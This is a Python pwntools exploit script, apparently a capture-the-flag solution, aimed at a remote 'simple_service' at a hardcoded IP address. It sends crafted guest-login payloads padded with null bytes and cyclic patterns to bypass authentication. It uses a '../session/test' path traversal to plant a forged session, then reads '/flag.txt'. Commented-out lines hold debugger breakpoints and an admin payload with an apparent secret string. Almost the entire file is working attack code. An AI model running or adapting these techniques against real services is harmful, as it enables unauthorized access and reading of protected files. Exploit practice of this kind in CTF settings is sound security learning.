from pwn import *
#p = process('./simple_service')
p = remote("45.122.249.68", 20004)
script = """
b*check_auth+184
b*check_auth+331
b*login_with_session
b*guest_handler
b*read_file
c
"""
#gdb.attach(p,script)

payload = b'guest'+ b'\x00' + cyclic(10)  + b'guest' +b'\x00'
#payload += b'A'*(32-len(payload)) + b'7VDrIs8J4lDLPOn0' #+ cyclic(50) #+b'guest' + #b'\x00'+cyclic(64-22)
print(payload)
p.sendline(payload)
time.sleep(0.3)
print(p.recv())
#msg = p.recvuntil(b'session/')
#leak = p.recvline().strip(b'\n').decode()
#print(leak)
# p.close()
# p = remote("45.122.249.68", 20004)
# payload = b'guest'+ b'\x00' + cyclic(10)  + b'guest' +b'\x00'
# payload += b'A'*(32-len(payload)) + str(leak).encode()
#p.recv()
p.sendline(b'1')
p.sendlineafter(b'Your message: ', b'2')
p.sendlineafter(b'Save as?',b'../session/test')
p.sendlineafter(b'Your choice: ', b'2')
#p.interactive()
p.close()
#p = process("./simple_service")
p = remote("45.122.249.68", 20004)
#gdb.attach(p,script)
payload2 = b'guest'+ b'\x00' + cyclic(10)  + b'guest' +b'\x00'
payload2 += b'A'*(32-len(payload2)) + b'test' + b'\x00'
p.sendline(payload2)
time.sleep(0.3)
print(p.recv().decode())
p.sendline(b'1')
time.sleep(0.3)
p.sendlineafter(b'File to read: ', b'/flag.txt')
p.interactive()
# payload3 = b'admin'+ b'\x00' + cyclic(10)  + b'YfBCEP6Bb9yIpKS' +b'\x00'
# payload3 += b'A'*(32-len(payload3)) + b'test' + b'\x00'
# p = remote("45.122.249.68", 20004)
# p.sendline(payload3)
# p.interactive()
